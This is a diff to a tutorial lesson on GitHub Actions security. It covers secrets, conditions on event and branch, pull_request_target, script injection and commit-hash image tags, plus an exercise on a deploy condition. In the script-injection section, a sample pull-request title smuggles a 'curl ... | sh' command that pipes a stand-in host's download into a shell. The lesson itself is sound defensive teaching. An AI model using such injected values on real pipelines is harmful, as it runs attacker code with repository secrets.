@@ -5,7 +5,8 @@ too much power, or ship the wrong thing. Here you fix four such risks, each
 found in a real-looking post-incident review.
 
 **New here:** your own secrets (`secrets.NAME`), `write-all`, conditions on
-`github.event_name` and `github.ref`, tags that move.
+`github.event_name` and `github.ref`, `pull_request_target`, script
+injection, tags that move.
 
 ## Learn
 
@@ -58,15 +59,17 @@ jobs:
 
 ### Conditions on the event
 
-One workflow often runs for several events. `github.event_name` and
-`github.ref` tell them apart:
+`if:` on a job holds an expression; there you may leave out the `${{ }}`.
+A job whose `if` is false is *skipped*, not failed, and the run stays
+green. One workflow often runs for several events, and the `github`
+context tells them apart:
 
-| What happened | `github.event_name` | `github.ref` |
-|---|---|---|
-| push to `main` | `push` | `refs/heads/main` |
-| push to `release/2.1` | `push` | `refs/heads/release/2.1` |
-| pull request #42 | `pull_request` | `refs/pull/42/merge` |
-| push of tag `v1.4.2` | `push` | `refs/tags/v1.4.2` |
+| What happened | `github.event_name` | `github.ref` | `github.ref_name` |
+|---|---|---|---|
+| push to `main` | `push` | `refs/heads/main` | `main` |
+| push to `release/2.1` | `push` | `refs/heads/release/2.1` | `release/2.1` |
+| pull request #42 | `pull_request` | `refs/pull/42/merge` | `42/merge` |
+| push of tag `v1.4.2` | `push` | `refs/tags/v1.4.2` | `v1.4.2` |
 
 ```yaml
   preview:                # a preview site for every pull request
@@ -75,8 +78,26 @@ One workflow often runs for several events. `github.event_name` and
     if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/release/2.1'
 ```
 
-A pull request from a branch in the same repository runs with the
-repository's secrets. A job without a condition runs for it too.
+`==` and `!=` compare (ignoring upper and lower case), `&&` means "and",
+`||` means "or", as in Go. Text goes in single quotes. A job without an
+`if:` runs for every event the workflow has.
+
+### Pull requests and secrets
+
+| Pull request from... | Trigger | Secrets? | Token |
+|---|---|---|---|
+| a branch in this repository | `pull_request` | yes | as the workflow sets it |
+| a fork (a stranger's copy) | `pull_request` | no | read-only |
+| a fork | `pull_request_target` | **yes** | can write |
+
+- `pull_request_target` runs the workflow from the **target** branch, so for
+  a pull request into `main`, `github.ref` is `refs/heads/main`. A check on
+  the branch alone can't tell it from a push to `main`; check the event too.
+- Never put text a stranger wrote, such as
+  `${{ github.event.pull_request.title }}`, straight into `run:`. GitHub
+  pastes it into the script before the shell runs, so a title like
+  `"; curl evil.sh | sh` becomes a command. Pass it through `env:` and use
+  `"$TITLE"` instead.
 
 ### Tags that move
 
@@ -90,12 +111,12 @@ push:
                                                   which run A never tested
 ```
 
-`github.sha` is the commit's hash: the same in every job of one run, and
-different for every commit. An image tagged with it names exactly one
-build:
+`github.sha` is the commit's 40-character hash: the same in every job of
+one run, and different for every commit. An image tagged with it names the
+build of exactly that commit:
 
 ```yaml
-tags: ghcr.io/acme/billing:build-${{ github.run_id }}
+tags: ghcr.io/acme/billing:${{ github.sha }}
 ```
 
 > **Why is it written like this?**
@@ -154,21 +175,24 @@ read the code and only `image` can push packages.
 
 - Keep both triggers: pull requests still need their tests.
 - `test` has no `if:`.
-- `deploy` still needs `test`, and gets exactly this condition (with or
-  without `${{ }}` around it):
+- `deploy` still needs `test`, and gets an `if:` (with or without `${{ }}`
+  around it) that checks **both** the event and the branch. The test tries
+  it on four events:
 
-  ```yaml
-  if: github.event_name == 'push' && github.ref == 'refs/heads/main'
-  ```
+| What happened | `github.event_name` | `github.ref` | `deploy` |
+|---|---|---|---|
+| push to `main` | `push` | `refs/heads/main` | runs |
+| push to `release/2.1` | `push` | `refs/heads/release/2.1` | skipped |
+| pull request #42 | `pull_request` | `refs/pull/42/merge` | skipped |
+| pull request into `main`, if someone adds `pull_request_target` later | `pull_request_target` | `refs/heads/main` | skipped |
 
-| What happened | Jobs that run |
-|---|---|
-| push to `main` | `test`, then `deploy` |
-| push to `release/2.1` | `test` |
-| pull request | `test` |
+Use `github.event_name`, `github.ref` (or `github.ref_name`), text in single
+quotes, `==`, `!=`, `&&` and `||`.
 
 **Think it through:**
-- Which row of the event table is the only one that should deploy?
+- Which row is the only one that should deploy? What do its two columns say?
+- Is "the event is `push`" safer than "the event is not `pull_request`"?
+  Look at the last row.
 - Where does `if:` go: on the job or on a step?
 
 ### 4. Deploy exactly what you tested
